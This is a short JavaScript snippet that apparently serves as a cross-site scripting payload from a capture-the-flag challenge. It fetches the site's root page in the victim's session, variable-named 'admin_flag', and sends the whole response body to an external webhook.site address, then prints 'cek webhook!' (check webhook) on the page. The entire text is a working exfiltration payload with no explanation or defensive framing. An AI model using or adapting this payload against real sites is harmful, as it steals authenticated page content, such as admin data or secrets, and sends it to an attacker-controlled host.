async function getNotes() {
    const admin_flag = await fetch('/', {
        method: 'GET',
        });
    const responseBody = await admin_flag.text();
    const send = await fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6' + '?response=' + encodeURIComponent(responseBody), {
    method: 'POST',
    });
    const output = document.createElement('p');
    output.textContent = _.capitalize('cek webhook!');
    document.body.appendChild(output);
}
getNotes();